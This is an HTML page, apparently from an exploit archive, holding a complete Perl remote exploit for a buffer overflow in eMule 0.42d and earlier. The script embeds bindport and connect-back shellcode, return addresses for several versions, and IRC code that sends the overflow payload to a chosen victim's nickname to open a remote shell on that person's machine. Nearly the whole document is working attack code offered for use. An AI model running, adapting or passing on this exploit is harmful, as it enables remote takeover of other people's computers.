<html>
<head>
<title>eMule <= 0.42d IRC Buffer Overflow Remote Exploit
</title>
<pre>
#!/usr/bin/perl
#
# eMule &lt;= 0.42d Remote Exploit by kcope
# 
# exploits the DecodeBase16 buffer overflow
# tested on WinXP SP1 / Win2k SP4
# bindport/connectback shellcode
#
# thanks Kostya Kortchinsky for his posting to bugtraq
# 
# greetings to sander, blackzero, beginna, adize, A-cru and wY :p
# have fun!
#
# kcope, kingcope gmx net Apr 2004
#

use Socket;
use Getopt::Std;

# bindport shellcode (port 2004) thanks to metasploit
$sc = &quot;\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\x21\x39&quot;.
&quot;\x11\x09\x83\xeb\xfc\xe2\xf4\xc9\x6f\x11\x09\x21\x6a\x44\x5f\x76&quot;.
&quot;\xb2\x7d\x2d\x39\xb2\x54\x35\xaa\x6d\x14\x71\x20\xd3\x9a\x43\x39&quot;.
&quot;\xb2\x4b\x29\x20\xd2\xf2\x3b\x68\xb2\x25\x82\x20\xd7\x20\xf6\xdd&quot;.
&quot;\x08\xd1\xa5\x19\xd9\x65\x0e\xe0\xf6\x1c\x08\xe6\xd2\xe3\x32\x5d&quot;.
&quot;\x1d\x05\x7c\xc0\xb2\x4b\x2d\x20\xd2\x77\x82\x2d\x72\x9a\x53\x3d&quot;.
&quot;\x38\xfa\x82\x25\xb2\x10\xe1\xca\x3b\x20\xc9\x7e\x67\x4c\x52\xe3&quot;.
&quot;\x31\x11\x57\x4b\x09\x48\x6d\xaa\x20\x9a\x52\x2d\xb2\x4a\x15\xaa&quot;.
&quot;\x22\x9a\x52\x29\x6a\x79\x87\x6f\x37\xfd\xf6\xf7\xb0\xd6\x88\xcd&quot;.
&quot;\x39\x10\x09\x21\x6e\x47\x5a\xa8\xdc\xf9\x2e\x21\x39\x11\x99\x20&quot;.
&quot;\x39\x11\xbf\x38\x21\xf6\xad\x38\x49\xf8\xec\x68\xbf\x58\xad\x3b&quot;.
&quot;\x49\xd6\xad\x8c\x17\xf8\xd0\x28\xcc\xbc\xc2\xcc\xc5\x2a\x5e\x72&quot;.
&quot;\x0b\x4e\x3a\x13\x39\x4a\x84\x6a\x19\x40\xf6\xf6\xb0\xce\x80\xe2&quot;.
&quot;\xb4\x64\x1d\x4b\x3e\x48\x58\x72\xc6\x25\x86\xde\x6c\x15\x50\xa8&quot;.
&quot;\x3d\x9f\xeb\xd3\x12\x36\x5d\xde\x0e\xee\x5c\x11\x08\xd1\x59\x71&quot;.
&quot;\x69\x41\x49\x71\x79\x41\xf6\x74\x15\x98\xce\x10\xe2\x42\x5a\x49&quot;.
&quot;\x3b\x11\x0e\xf5\xb0\xf1\x63\x31\x69\x46\xf6\x74\x1d\x42\x5e\xde&quot;.
&quot;\x6c\x39\x5a\x75\x6e\xee\x5c\x01\xb0\xd6\x61\x62\x74\x55\x09\xa8&quot;.
&quot;\xda\x96\xf3\x10\xf9\x9c\x75\x05\x95\x7b\x1c\x78\xca\xba\x8e\xdb&quot;.
&quot;\xba\xfd\x5d\xe7\x7d\x35\x19\x65\x5f\xd6\x4d\x05\x05\x10\x08\xa8&quot;.
&quot;\x45\x35\x41\xa8\x45\x35\x45\xa8\x45\x35\x59\xac\x7d\x35\x19\x75&quot;.
&quot;\x69\x40\x58\x70\x78\x40\x40\x70\x68\x42\x58\xde\x4c\x11\x61\x53&quot;.
&quot;\xc7\xa2\x1f\xde\x6c\x15\xf6\xf1\xb0\xf7\xf6\x54\x39\x79\xa4\xf8&quot;.
&quot;\x3c\xdf\xf6\x74\x3d\x98\xca\x4b\xc6\xee\x3f\xde\xea\xee\x7c\x21&quot;.
&quot;\x51\x6f\xd1\xc3\x4a\xee\x5c\x25\x08\xca\x5a\xde\xe9\x11\x09&quot;;

# connect back shellcode by lion, xor 0x21 
$cbsc = 
&quot;\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\x21\xE2\xFA&quot;.
&quot;\xEB\x05\xE8\xEB\xFF\xFF\xFF&quot;.
&quot;\xC8\xDA\x21\x21\x21\x7E\x45\x80\x11\x21\x21\x21\xAA\x61\x2D\xAA&quot;.
&quot;\x51\x3D\x8C\xAA\x49\x29\xAA\xD6\x4B\x25\x78\xC9\xBA\x21\x21\x21&quot;.
&quot;\xC3\xD8\x49\x12\x13\x21\x21\x49\x56\x52\x13\x7E\x75\xDE\x37\xAA&quot;.
&quot;\xC9\x4B\x25\x78\xC9\xA3\x21\x21\x21\xC3\xD8\xA0\xCD\xB1\x20\x21&quot;.
&quot;\x21\x75\x49\x20\x20\x21\x21\xDE\x77\x31\x71\x71\x71\x71\x61\x71&quot;.
&quot;\x61\x71\xDE\x77\x35\xAA\xF9\x49\x5E\x21\x21\x20\x49\x23\x21\x21&quot;.
&quot;\x14\xAA\xED\x4B\x31\x70\x72\xDE\x77\x39\xA4\xE1\x54\x6B\x49\x42&quot;.
&quot;\x4C\x45\x21\xA8\x47\x11\xA2\xCD\x75\xAC\x1D\x05\x4B\x34\x78\x8A&quot;.
&quot;\xC3\xDC\xE7\x65\x05\x31\x65\xDF\x65\x05\x1C\xA8\x7D\x05\x69\xA8&quot;.
&quot;\x7D\x05\x6D\xA8\x7D\x05\x71\xAC\x65\x05\x31\x75\x71\x70\x70\x70&quot;.
&quot;\x4B\x20\x70\x70\xDE\x57\x11\x70\xDE\x77\x25\xAA\xED\x4B\xDE\xDE&quot;.
&quot;\x10\xDE\x77\x29\x72\xDE\x77\x3D\xDE\x77\x2D\x70\x77\xAA\x64\x1D&quot;.
&quot;\xAA\x75\x09\x59\x22\xF4\x73\xAA\x53\x01\x22\xD4\x12\xE8\x68\x60&quot;.
&quot;\x8C\x22\xE4\x12\xFA\x2E\x9F\x31\x1B\xF7\x55\x29\xE0\xEA\x2C\x22&quot;.
&quot;\xFB\x61\xCA\xD0\x1A\x3E\x54\xC6\x7B\xAA\x7B\x05\x22\xFC\x47\xAA&quot;.
&quot;\x2D\x6A\xAA\x7B\x3D\x22\xFC\xAA\x25\xAA\x22\xE4\x8A\x7F\x78\xE2&quot;.
&quot;\xC9\x21\xDE\xDE\xDE\xAF\x6F\x2F\xCD\x53\xDF\x92\x37\x8C\xF8\x24&quot;.
&quot;\xEF\x5F\xF9\xC3\x52\xEA\xCC\xDD\x1A\xF8\x28\xD4\x8C\xCD\xD8\x8B&quot;.
&quot;\x41\xC6\x58\xE7\x58&quot;;

# find shellcode in memory
$find_sc = &quot;648B3D08000000BA0100000042424264&quot;.
&quot;8B1A8BCB2BCFB0D9909090FCF2AE803F&quot;.
&quot;EE9075F8807F01D975F2BA0100000042&quot;.
&quot;803C3A7475E64FFFE79090&quot;;

$find_sccb = &quot;648B3D08000000BA0100000042424264&quot;.
&quot;8B1A8BCB2BCFB0EB909090FCF2AE803F&quot;.
&quot;109075F8807F015B75F2BA0100000042&quot;.
&quot;803C3A4B75E64FFFE79090&quot;; 

$numtargets = 4;

@targets = 
(
[&quot;eMule 0.42d&quot;, &quot;7af65700&quot;, 76],
[&quot;eMule 0.42c&quot;, &quot;514c5f00&quot;, 76],
[&quot;eMule 0.42b (Hotfix)&quot;, &quot;d12e5f00&quot;, 76],
[&quot;eMule 0.42a&quot;, &quot;012f5f00&quot;, 76]
# [&quot;eMule 0.30e&quot;, &quot;acf65b00&quot;, 20]
);

$exploiting_nick = &quot;eMuleIRC3713&quot;; # change this nickname if needed

sub connecttoserver()
{
$bool = &quot;yes&quot;;
$iaddr = inet_aton($ircserver) || die(&quot;Failed to find host: $ircserver&quot;);
$paddr = sockaddr_in($ircport, $iaddr);
$proto = getprotobyname('tcp');
socket(SOCK1, PF_INET, SOCK_STREAM, $proto) || die(&quot;Failed to open socket:$!&quot;);
connect(SOCK1, $paddr) || {$bool = &quot;no&quot;};
}

sub usage() {

print &quot;usage: emule4x.pl -n &lt;nick&gt; -s &lt;server&gt; &lt;-t type&gt; [-p port] [-c &lt;ip:port&gt;]\r\n&quot;.
&quot;use -c switch for reverse shell\r\n&quot;. 
&quot;example: perl emule4x.pl -n emuleuser -s irc.somenet.com -t 0\r\n\r\ntarget types:\r\n&quot;;

for ($i=0; $i&lt;$numtargets; $i++) {
print &quot;\t[&quot;.$i.&quot;]...&quot;. $targets[$i][0]. &quot;\r\n&quot;;
} 
exit;
}

$| = 1;
print &quot;\r\n----------------------------------------------------------------------\r\n&quot;;
print &quot;eMule &lt;= 0.42d Remote Exploit by kcope . kingcope[at]gmx.net\r\n\r&quot;;
print &quot;Tested on Win2k SP4/WinXP SP1\r\n&quot;;
print &quot;----------------------------------------------------------------------\r\nLets have fun!\r\n\r\n&quot;;

if (@ARGV &lt; 4) {
usage(); 
}

%options=();
getopt(&quot;scnpt&quot;,\%options);

$nickname = $options{n};
$ircserver = $options{s};
$type = $options{t};

if (!defined $targets[$type][0]) {
print &quot;Invalid target type.\r\n&quot;;
exit;
}

if (!defined $type) {
print &quot;Please specify a target type.\r\n&quot;;
exit;
}

if (defined $options{p}) {
$ircport = $options{p};
} else {
$ircport = 6667;
}

$usecb=-1;
if (defined $options{c}) {
$usecb=1;
$idx = index $options{c},&quot;:&quot;;
$cbip = substr $options{c},0,$idx;
$cbport = substr $options{c},$idx+1; 
}

print &quot;Target type set to &quot;.$targets[$type][0].&quot;.\r\n&quot;;
$ret = $targets[$type][1];
$nops1 = &quot;90&quot; x $targets[$type][2];
$nops2 = &quot;90&quot; x 40; # customize if needed

if ($usecb eq 1) {
($a1, $a2, $a3, $a4) = split(//, gethostbyname(&quot;$cbip&quot;));
$a1 = chr(ord($a1) ^ 0x21);
$a2 = chr(ord($a2) ^ 0x21);
$a3 = chr(ord($a3) ^ 0x21);
$a4 = chr(ord($a4) ^ 0x21);
substr($cbsc, 111, 4, $a1 . $a2 . $a3 . $a4);

($p1, $p2) = split(//, reverse(pack(&quot;s&quot;, $cbport)));
$p1 = chr(ord($p1) ^ 0x21);
$p2 = chr(ord($p2) ^ 0x21);
substr($cbsc, 118, 2, $p1 . $p2);

print &quot;Using connect back method on $cbip port $cbport.\r\n&quot;;
}

print &quot;Connecting to $ircserver on port $ircport...&quot;;

connecttoserver();

if ($bool eq &quot;no&quot;)
{
print &quot;Connection refused.\r\n&quot;;
exit(0);
}

send(SOCK1,&quot;NICK $exploiting_nick\r\n&quot;,0);
send(SOCK1,&quot;USER $exploiting_nick \&quot;yahoo.com\&quot; \&quot;eu.dal.net\&quot; :$exploiting_nick\r\n&quot;,0);

while (&lt;SOCK1&gt;) { 
$line = $_;
# print $line;
if ((index $line, &quot; 376 &quot;) ne -1) {
goto logged_in; 
}

if ((index $line, &quot;PING&quot;) ne -1) {
substr($line,1,1,&quot;O&quot;);
send(SOCK1, $line, 0); 
}
}

logged_in:

print &quot; ok\r\n&quot;; 
sleep(4); 
print &quot;Sending buffers to $nickname...&quot;;

# 005f4c51 eMule 0.42c (514c5f00)
# 0057f67a eMule 0.42d (7AF65700)

if ($usecb eq 1) {
send(SOCK1, &quot;PRIVMSG $nickname :$cbsc\r\n&quot;, 0);
send(SOCK1, &quot;PRIVMSG $nickname :\x01SENDLINK\|&quot; . $nops1 . &quot;EB079090&quot;. $ret .
&quot;906681EC4000&quot;. $nops2 . $find_sccb .&quot;\|\x01\r\n&quot;, 0);
} else {
send(SOCK1, &quot;PRIVMSG $nickname :$sc\r\n&quot;, 0);
send(SOCK1, &quot;PRIVMSG $nickname :\x01SENDLINK\|&quot; . $nops1 . &quot;EB079090&quot;. $ret .
&quot;906681EC4000&quot;. $nops2 . $find_sc .&quot;\|\x01\r\n&quot;, 0); 
}

if ($usecb ne 1) {
print &quot;\r\nNow try connecting to &quot;.$nickname.&quot;'s ip on port 2004.\r\n&quot;;
} else {
print &quot;\r\nWatch at your netcat for some shell.\r\n&quot;; 
}

$recv = &lt;SOCK1&gt;;
$recv = &lt;SOCK1&gt;;
$recv = &lt;SOCK1&gt;;
$recv = &lt;SOCK1&gt;;
$recv = &lt;SOCK1&gt;;
$recv = &lt;SOCK1&gt;;
$recv = &lt;SOCK1&gt;;
$recv = &lt;SOCK1&gt;;
$recv = &lt;SOCK1&gt;;
print &quot; done\r\n&quot;;

# EOF </pre>
# milw0rm.com [2004-04-12]
</html>

